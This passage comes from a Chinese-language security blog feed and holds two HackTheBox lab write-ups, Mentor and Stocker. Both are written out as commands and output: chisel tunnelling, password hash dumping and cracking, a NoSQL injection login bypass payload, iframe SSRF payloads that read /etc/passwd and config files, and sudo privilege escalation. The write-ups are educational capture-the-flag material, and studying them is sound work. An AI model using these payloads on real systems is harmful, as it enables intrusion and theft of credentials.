engine <span class="token operator">=</span> create_engine<span class="token punctuation">(</span>DATABASE_URL<span class="token punctuation">)</span>
metadata <span class="token operator">=</span> MetaData<span class="token punctuation">(</span><span class="token punctuation">)</span>
quotes <span class="token operator">=</span> Table<span class="token punctuation">(</span>
    <span class="token string">"quotes"</span><span class="token punctuation">,</span>
    metadata<span class="token punctuation">,</span>
    Column<span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">,</span> Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    Column<span class="token punctuation">(</span><span class="token string">"title"</span><span class="token punctuation">,</span> String<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    Column<span class="token punctuation">(</span><span class="token string">"description"</span><span class="token punctuation">,</span> String<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    Column<span class="token punctuation">(</span><span class="token string">"created_date"</span><span class="token punctuation">,</span> DateTime<span class="token punctuation">,</span> default<span class="token operator">=</span>func<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
<span class="token punctuation">)</span>

<span class="token comment"># SQLAlchemy for users</span>
engine <span class="token operator">=</span> create_engine<span class="token punctuation">(</span>DATABASE_URL<span class="token punctuation">)</span>
metadata <span class="token operator">=</span> MetaData<span class="token punctuation">(</span><span class="token punctuation">)</span>
users <span class="token operator">=</span> Table<span class="token punctuation">(</span>
    <span class="token string">"users"</span><span class="token punctuation">,</span>
    metadata<span class="token punctuation">,</span>
    Column<span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">,</span> Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    Column<span class="token punctuation">(</span><span class="token string">"email"</span><span class="token punctuation">,</span> String<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    Column<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">,</span> String<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    Column<span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">,</span> String<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">,</span>nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
<span class="token punctuation">)</span>

<span class="token comment"># Databases query builder</span>
database <span class="token operator">=</span> Database<span class="token punctuation">(</span>DATABASE_URL<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä¸ºäº†ä¸PostgreSQLæ•°æ®åº“äº¤äº’ï¼Œéœ€è¦ç”¨åˆ°<code>chisel</code>å·¥å…·</p>
<p>chiselå·¥å…·ï¼š<a href="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a></p>
<p>ä»æœ¬åœ°ä¼ ä¸€ä¸ªchisel</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">æœ¬åœ°ï¼špython3 -m http.server 80
é¶æœºï¼šwget http://[æœ¬åœ°IP]/chisel<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>ï¼ˆPSï¼šè¿™é‡Œçœ‹åˆ°é¶æœºIPä¸º10.129.89.191ï¼Œä¸ä¹‹å‰çš„10.10.11.193ä¸ä¸€è‡´ï¼Œæ˜¯å› ä¸ºé¶æœºä¸­é—´ç½‘ç»œä¸­æ–­ï¼Œæˆ‘åˆ‡æ¢è¿‡é¶æœºç¯å¢ƒï¼Œæœ¬è´¨ä¸Šä»–ä¿©éƒ½æ˜¯è¿™å°é¶æœºåœ°å€ï¼‰</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230312130938191.png"></p>
<p>å°†chiselå¤åˆ¶åˆ°<code>/tmp</code>æ–‡ä»¶å¤¹ä¸‹ï¼Œå¹¶æ·»åŠ å¯æ‰§è¡Œæƒé™</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230309164015713.png"></p>
<p>æœ¬åœ°æ‰§è¡Œï¼š</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">chmod +x chisel
./chisel server --port 9899 --reverse<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>é¶æœºæ‰§è¡Œï¼š</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">chmod +x chisel
./chisel client -v 10.10.X.X:9899 R:5432:172.22.0.1:5432<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230309164938550.png"></p>
<p>è¿æ¥æ•°æ®åº“ï¼Œå¯†ç æ˜¯<code>postgres</code></p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# psql -h 10.10.X.X -U "postgres" -p 5432
Password for user postgres: 
psql (13.2 (Debian 13.2-1), server 13.7 (Debian 13.7-1.pgdg110+1))
Type "help" for help.

postgres=# \list
                                    List of databases
      Name       |  Owner   | Encoding |  Collate   |   Ctype    |   Access privileges   
-----------------+----------+----------+------------+------------+-----------------------
 mentorquotes_db | postgres | UTF8     | en_US.utf8 | en_US.utf8 | 
 postgres        | postgres | UTF8     | en_US.utf8 | en_US.utf8 | 
 template0       | postgres | UTF8     | en_US.utf8 | en_US.utf8 | =c/postgres          +
                 |          |          |            |            | postgres=CTc/postgres
 template1       | postgres | UTF8     | en_US.utf8 | en_US.utf8 | =c/postgres          +
                 |          |          |            |            | postgres=CTc/postgres
(4 rows)

postgres=# \c mentorquotes_db 
psql (13.2 (Debian 13.2-1), server 13.7 (Debian 13.7-1.pgdg110+1))
You are now connected to database "mentorquotes_db" as user "postgres".
mentorquotes_db=# \d
              List of relations
 Schema |     Name      |   Type   |  Owner   
--------+---------------+----------+----------
 public | cmd_exec      | table    | postgres
 public | quotes        | table    | postgres
 public | quotes_id_seq | sequence | postgres
 public | users         | table    | postgres
 public | users_id_seq  | sequence | postgres
(5 rows)

mentorquotes_db=# select * from users;
 id |         email          |  username   |             password             
----+------------------------+-------------+----------------------------------
  1 | james@mentorquotes.htb | james       | 7ccdcd8c05b59add9c198d492b36a503
  2 | svc@mentorquotes.htb   | service_acc | 53f22d0dfa10dce7e29cd31f4f953fd8
  4 | wa0er@mentorquotes.htb | james       | ad4ece449e52f57769466a281720b825
  5 | james@mentorquotes.htb | wa0er       | ad4ece449e52f57769466a281720b825
  6 | admin@mentorquotes.htb | admin       | ad4ece449e52f57769466a281720b825
(5 rows)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è·å–åˆ°ç”¨æˆ·å¯†ç hashå€¼ï¼Œåªæœ‰å‰ä¸¤ä¸ªæœ‰ç”¨ï¼Œåé¢çš„æ˜¯ä¹‹å‰è‡ªå·±æ·»åŠ çš„</p>
<p>ç ´è§£ä¸€ä¸‹<a href="https://crackstation.net/">https://crackstation.net/</a></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230309165816876.png"></p>
<p>å¾—åˆ°svcè´¦æˆ·çš„å¯†ç </p>
<pre class="line-numbers language-none"><code class="language-none">123meunomeeivani<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ç™»å½•ssh</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# ssh svc@10.10.11.193
svc@10.10.11.193's password: 
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-56-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Mar  9 09:03:14 AM UTC 2023

  System load:                      0.0
  Usage of /:                       65.3% of 8.09GB
  Memory usage:                     15%
  Swap usage:                       0%
  Processes:                        243
  Users logged in:                  0
  IPv4 address for br-028c7a43f929: 172.20.0.1
  IPv4 address for br-24ddaa1f3b47: 172.19.0.1
  IPv4 address for br-3d63c18e314d: 172.21.0.1
  IPv4 address for br-7d5c72654da7: 172.22.0.1
  IPv4 address for br-a8a89c3bf6ff: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.193
  IPv6 address for eth0:            dead:beef::250:56ff:feb9:d789


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Dec 12 10:22:58 2022 from 10.10.14.40
svc@mentor:~$ id
uid=1001(svc) gid=1001(svc) groups=1001(svc)
svc@mentor:~$ pwd
/home/svc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="å››ã€æƒé™æå‡"><a href="#å››ã€æƒé™æå‡" class="headerlink" title="å››ã€æƒé™æå‡"></a>å››ã€æƒé™æå‡</h2><p>ä»æœ¬åœ°ä¼ ä¸€ä¸ª<code>linpeas</code>å·¥å…·ï¼Œè¿è¡Œä¸€ä¸‹ï¼Œåˆ†æå¯çœ‹åˆ°æœ‰SNMPæœåŠ¡çš„ç›¸å…³é…ç½®æ–‡ä»¶</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230309172001148.png"></p>
<p>æŸ¥çœ‹<code>/etc/snmp/snmpd.conf</code>ï¼Œå¯çœ‹åˆ°æœ‰ä¸ªå¯†ç ï¼Œç«™ç‚¹å±ä¸»æ˜¯jamesï¼Œé‚£åº”è¯¥å°±æ˜¯jamesçš„å¯†ç ï¼ˆè¿™ä¸ªå¯†ç è·Ÿä¹‹å‰çš„å¯†ç ä¸ä¸€æ ·ï¼Œå¯èƒ½å‰é¢çš„é‚£ä¸ªåªæ˜¯å¹³å°jamesç®¡ç†å‘˜çš„å¯†ç ï¼Œè¿™ä¸ªåœ°æ–¹æ˜¯linuxç»ˆç«¯jamesç”¨æˆ·çš„å¯†ç ï¼‰</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">svc@mentor:/tmp$ cat /etc/snmp/snmpd.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230309172447153.png"></p>
<pre class="line-numbers language-none"><code class="language-none">SuperSecurePassword123__<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>åˆ‡æ¢åˆ°jamesç”¨æˆ·ï¼Œæ‰§è¡Œ<code>sudo -l</code>å¯çœ‹åˆ°jamesç”¨æˆ·æœ‰æ‰§è¡Œ<code>/bin/sh</code>å‘½ä»¤çš„æƒé™</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">svc@mentor:/tmp$ su james
Password: 
james@mentor:/tmp$ id
uid=1000(james) gid=1000(james) groups=1000(james)
james@mentor:/tmp$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on mentor:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User james may run the following commands on mentor:
    (ALL) /bin/sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æ‰§è¡Œ<code>/bin/sh</code>ï¼ŒæˆåŠŸè·å–rootæƒé™</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">james@mentor:/tmp$ sudo /bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>Overï¼</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230310104724341.png" style="zoom: 67%;">

<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p>Hackthebox Mentor Writeupï¼š<a href="https://0xdedinfosec.vercel.app/blog/hackthebox-mentor-writeup">https://0xdedinfosec.vercel.app/blog/hackthebox-mentor-writeup</a></p>
<p>å®æˆ˜SNMPæœåŠ¡æ”»å‡»ï¼š<a href="https://www.freebuf.com/articles/network/319234.html">https://www.freebuf.com/articles/network/319234.html</a></p>
]]></content>
      <categories>
        <category>é¶æœº</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Swagger UI</tag>
        <tag>SNMP</tag>
        <tag>JWTå‘½ä»¤æ‰§è¡Œ</tag>
        <tag>PostgreSQLæ•°æ®åº“</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Stocker</title>
    <url>/posts/77989ccd.html</url>
    <content><![CDATA[<h1 id="HTB-Stocker"><a href="#HTB-Stocker" class="headerlink" title="HTB-Stocker"></a>HTB-Stocker</h1><h2 id="ä¸€ã€æ€è·¯æ¦‚è¦"><a href="#ä¸€ã€æ€è·¯æ¦‚è¦" class="headerlink" title="ä¸€ã€æ€è·¯æ¦‚è¦"></a>ä¸€ã€æ€è·¯æ¦‚è¦</h2><ol>
<li><p>ä¿¡æ¯æ”¶é›†å‘ç°ç™»å½•ç‚¹ï¼Œå°è¯•å‘ç°ç™»å½•ç‚¹å­˜åœ¨NoSQLæ³¨å…¥ï¼›</p>
</li>
<li><p>NoSQLæ³¨å…¥ç»•è¿‡ç™»å½•éªŒè¯ï¼›</p>
</li>
<li><p>æäº¤è´­ç‰©ä¿¡æ¯å‘ç°æœ‰PDFå­˜åœ¨SSRFï¼›</p>
</li>
<li><p>SSRFè¯»å–æ•æ„Ÿæ–‡ä»¶å‘ç°SSHç”¨æˆ·ï¼›</p>
</li>
<li><p><code>sudo -l</code>å‘ç°SSHç”¨æˆ·æœ‰æ‰§è¡Œæ–‡ä»¶æƒé™ï¼›</p>
</li>
<li><p>æ‰§è¡Œæ–‡ä»¶åå¼¹shellï¼Œè·å–rootæƒé™ã€‚</p>
</li>
</ol>
<h2 id="äºŒã€ä¿¡æ¯æ”¶é›†"><a href="#äºŒã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="äºŒã€ä¿¡æ¯æ”¶é›†"></a>äºŒã€ä¿¡æ¯æ”¶é›†</h2><p>nmap</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">â”Œâ”€â”€(rootğŸ’€kali)-[~/æ¡Œé¢]
â””â”€# nmap -sC -sV -oA stocker 10.10.11.196
Starting Nmap 7.91 ( https://nmap.org ) at 2023-02-06 22:42 EST
Nmap scan report for stocker.htb (10.10.11.196)
Host is up (0.15s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3d:12:97:1d:86:bc:16:16:83:60:8f:4f:06:e6:d5:4e (RSA)
|   256 7c:4d:1a:78:68:ce:12:00:df:49:10:37:f9:ad:17:4f (ECDSA)
|_  256 dd:97:80:50:a5:ba:cd:7d:55:e8:27:ed:28:fd:aa:3b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-generator: Eleventy v2.0.0
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Stock - Coming Soon!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.11 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¼€æ”¾ç«¯å£ï¼š22ï¼ˆsshï¼‰ã€80ï¼ˆhttpï¼‰ï¼ŒåŸŸåï¼š<code>stocker.htb</code></p>
<p>æ·»åŠ åŸŸååˆ°æœ¬åœ°hostsæ–‡ä»¶</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">â”Œâ”€â”€(rootğŸ’€kali)-[~/æ¡Œé¢]
â””â”€# echo "10.10.11.196 stocker.htb" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>è®¿é—®stocker.htbï¼ˆ<strong>æ³¨ï¼š</strong>è‹¥kaliç§‘å­¦ä¸Šç½‘æ–¹æ¡ˆé‡‡ç”¨çš„æ˜¯é€šè¿‡proxychainsä»£ç†åˆ°ç‰©ç†æœºï¼Œåˆ™æ­¤å¤„ç”¨proxychainsæ‰“å¼€çš„firefoxæ¥è®¿é—®stocker.htbä¼šæ‰“ä¸å¼€ã€‚å› ä¸ºæ­¤æ—¶HTTPè¯·æ±‚æµé‡ä¼šè¢«ä»£ç†åˆ°ç‰©ç†æœºï¼Œè€Œä¸èµ°HTBå®˜æ–¹ç»™çš„VPNé€šé“ã€‚è‡³äºä¸ºä»€ä¹ˆä»£ç†åˆ°ç‰©ç†æœºå°±æ‰“ä¸å¼€ï¼Œç›¸å…³å…·ä½“ç»†èŠ‚å¯ä»¥é€šè¿‡Wiresharkç»“åˆè®¡ç®—æœºç½‘ç»œçŸ¥è¯†åˆ†æï¼‰</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230207115217110.png"></p>
<p>ç”¨<code>gobuster</code>çˆ†ä¸€ä¸‹å­åŸŸå</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u stocker.htb -t 50 --append-domain
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://stocker.htb
[+] Method:          GET
[+] Threads:         50
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.5
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
2023/03/14 21:37:39 Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.stocker.htb Status: 302 [Size: 28] [--&gt; /login]
Progress: 4968 / 4990 (99.56%)
===============================================================
2023/03/14 21:38:08 Finished
===============================================================<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æœ‰ä¸ª<code>dev.stocker.htb</code>å­åŸŸï¼Œ302é‡å®šå‘åˆ°<code>/login</code>ç›®å½•ï¼ŒåŒæ ·æ·»åŠ åˆ°hostsæ–‡ä»¶</p>
<pre class="line-numbers language-none"><code class="language-none">â”Œâ”€â”€(rootğŸ’€kali)-[~/æ¡Œé¢]
â””â”€# echo "10.10.11.196 dev.stocker.htb" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>è®¿é—®ï¼Œç¡®å®æ˜¯ä¸ªç™»å½•é¡µé¢</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230315094312360.png" style="zoom:67%;">

<p>ç”¨Wappalyzeræ’ä»¶çœ‹åˆ°ç½‘ç«™æ˜¯Nodejså†™çš„</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230315161915203.png" style="zoom: 67%;">

<h2 id="ä¸‰ã€NoSQLæ³¨å…¥"><a href="#ä¸‰ã€NoSQLæ³¨å…¥" class="headerlink" title="ä¸‰ã€NoSQLæ³¨å…¥"></a>ä¸‰ã€NoSQLæ³¨å…¥</h2><p>NoSQLï¼š<a href="https://www.mongodb.com/zh-cn/nosql-explained">https://www.mongodb.com/zh-cn/nosql-explained</a></p>
<p>ä¸€èˆ¬è€Œè¨€ï¼ŒNoSQLæ•°æ®åº“æ˜¯å¯¹éå…³ç³»å‹æ•°æ®åº“çš„ç»Ÿç§°ï¼Œæ˜¯ä¸ªå¹¿ä¹‰æ¦‚å¿µã€‚å¸¸è§NoSQLæ•°æ®åº“ï¼Œå¦‚MongoDBï¼ˆæ–‡æ¡£æ•°æ®åº“ï¼‰ã€Redisï¼ˆé”®å€¼æ•°æ®åº“ï¼‰ã€Cassandraï¼ˆå®½åˆ—å­˜å‚¨æ•°æ®åº“ï¼‰ã€JanusGraphï¼ˆå›¾å½¢æ•°æ®åº“ï¼‰ç­‰ã€‚</p>
<p>éšä¾¿è¾“å…¥ä¸€ç»„ç”¨æˆ·åå¯†ç ç™»å½•ï¼Œå¹¶ç”¨BurpæŠ“åŒ…ï¼Œé‡æ”¾</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230315094816337.png"></p>
<p>è¿”å›ç™»å½•å¤±è´¥çš„æŠ¥é”™</p>
<p>ä¿®æ”¹<code>Content-Type</code>å€¼ä¸º<code>application/json</code>ï¼Œä¿®æ”¹è¯·æ±‚åŒ…æ•°æ®éƒ¨åˆ†å¦‚ä¸‹</p>
<pre class="line-numbers language-none"><code class="language-none">{"username":{"$ne":"admin"}, "password":{"$ne":"admin"}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230315095429644.png"></p>
<p>å¯çœ‹åˆ°302é‡å®šå‘åˆ°<code>/stock</code>ç›®å½•ï¼Œæµè§ˆå™¨æ‰“å¼€æ­¤ç›®å½•ï¼Œå‘ç°æˆåŠŸç™»å½•</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230315095836862.png" style="zoom:80%;">

<h2 id="å››ã€SSRF"><a href="#å››ã€SSRF" class="headerlink" title="å››ã€SSRF"></a>å››ã€SSRF</h2><p>é¡µé¢ä¸‹æ‹‰ï¼Œéšä¾¿é€‰ä¸€ä¸ªå•†å“ï¼Œæ­¤å¤„é€‰äº†ä¸€ä¸ªæ¯å­ï¼Œæ·»åŠ åˆ°è´­ç‰©è½¦ï¼Œç„¶åæŸ¥çœ‹è´­ç‰©è½¦ï¼Œç‚¹å‡»æäº¤è´­ä¹°ï¼ŒåŒæ—¶ç”¨BurpæŠ“å–è¯·æ±‚åŒ…</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230315102659311.png" style="zoom:67%;">

<p>å¯çœ‹åˆ°å½“å‰ç›®å½•æ˜¯åœ¨<code>/api/order</code>ï¼ŒBurpé‡æ”¾è¯·æ±‚åŒ…ä¹‹åï¼Œå¯çœ‹åˆ°è¿”å›ä¸€ä¸ª<code>orderId</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230315102734894.png"></p>
<p>å›åˆ°æµè§ˆå™¨ï¼Œå–æ¶ˆBurpä»£ç†æŠ“åŒ…ï¼Œæœ‰å¦‚ä¸‹å¼¹çª—ï¼Œç‚¹å‡»hereè·³è½¬</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230315103236801.png"></p>
<p>å‘ç°é¡µé¢è·³è½¬åˆ°<code>/api/po/[OrderID]</code>ï¼Œæ˜¯ä¸ªPDF</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230315202031022.png"></p>
<p>åœ¨å°è¯•åï¼Œå‘ç°ä¿®æ”¹titleå­—æ®µå€¼ï¼Œé¡µé¢ä¸­çš„Itemæ¡ç›®ä¼šç›¸åº”å˜æˆtitleå­—æ®µå€¼ï¼ˆæ¯æ¬¡åœ¨Burpä¿®æ”¹titleå­—æ®µå€¼ï¼Œç„¶åé‡æ”¾è¯·æ±‚åŒ…åï¼ŒæŠŠè¿”å›çš„OrderIDå€¼å¤åˆ¶ç²˜è´´åˆ°URLæ æœ«å°¾å³å¯è®¿é—®ï¼‰</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230315202202143.png"></p>
<p>å‚è€ƒ</p>
<p><a href="https://www.triskelelabs.com/blog/extracting-your-aws-access-keys-through-a-pdf-file">https://www.triskelelabs.com/blog/extracting-your-aws-access-keys-through-a-pdf-file</a></p>
<p><a href="https://techkranti.com/ssrf-aws-metadata-leakage/">https://techkranti.com/ssrf-aws-metadata-leakage/</a></p>
<p>äºæ˜¯ä¿®æ”¹titleå­—æ®µå€¼å¦‚ä¸‹ï¼Œå°è¯•è¯»å–<code>etc/passwd</code>æ–‡ä»¶</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;iframe src=/etc/passwd&gt;&lt;/iframe&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230315102941535.png"></p>
<p>Itemæ¡ç›®æ˜¾ç¤ºå‡º<code>/etc/passwd</code>å†…å®¹ï¼Œä½†ä¸æ˜¯å¾ˆå…¨</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230315103324426.png"></p>
<p>é‚£å°±å°è¯•æŠŠå®½é«˜è®¾å¤§ä¸€äº›ï¼Œå†æ¬¡è¯»å–ï¼Œå‘ç°èƒ½çœ‹åˆ°çš„éƒ¨åˆ†å°±å¤šäº†</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;iframe src=/etc/passwd height=500 width=500&gt;&lt;/iframe&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230315104739794.png"></p>
<p>è¯»å–nginxé»˜è®¤é…ç½®</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;iframe src=file:///etc/nginx/nginx.conf height=1100px width=1100px&lt;/iframe&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å‘ç°ç½‘ç«™æ ¹ç›®å½•åœ¨<code>/var/www/dev</code>ï¼Œé‚£å°±å°è¯•è¯»å–<code>index.js</code>é…ç½®æ–‡ä»¶</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;iframe src=file:///var/www/dev/index.js height=1000px width=1000px&gt;&lt;/iframe&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230315105404295.png"></p>
<p>é€šè¿‡å‰é¢/etc/passwdï¼ŒçŸ¥é“æœ‰ä¸¤ä¸ªæ™®é€šç”¨æˆ·ï¼Œmongdbå’Œangooseï¼Œé…ç½®æ–‡ä»¶ä¸­æœ‰ä¸€ä¸ªç–‘ä¼¼å¯†ç çš„å­—ç¬¦ä¸²</p>
<p>å°è¯•ä¹‹åï¼Œå‘ç°SSHç”¨æˆ·å¯†ç å¦‚ä¸‹</p>
<pre class="line-numbers language-none"><code class="language-none">Angoose
IHeardPassphrasesArePrettySecure<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# ssh angoose@10.10.11.196
The authenticity of host '10.10.11.196 (10.10.11.196)' can't be established.
ECDSA key fingerprint is SHA256:DX/9+PB1w20dghcXwm9QPFH88qM0aiPr+RyA+wzHnng.
Are you sure you want to continue connecting (yes/no/[fingerprint])? y
Please type 'yes', 'no' or the fingerprint: yes
Warning: Permanently added '10.10.11.196' (ECDSA) to the list of known hosts.
angoose@10.10.11.196's password: 
Last login: Tue Mar 14 22:45:53 2023 from 10.10.14.187
angoose@stocker:~$ id
uid=1001(angoose) gid=1001(angoose) groups=1001(angoose)
angoose@stocker:~$ pwd
/home/angoose<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="äº”ã€æƒé™æå‡"><a href="#äº”ã€æƒé™æå‡" class="headerlink" title="äº”ã€æƒé™æå‡"></a>äº”ã€æƒé™æå‡</h2><p><code>sudo -l</code>æŸ¥çœ‹angooseç”¨æˆ·æƒé™</p>
<pre class="line-numbers language-none"><code class="language-none">angoose@stocker:~$ sudo -l
[sudo] password for angoose: 
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
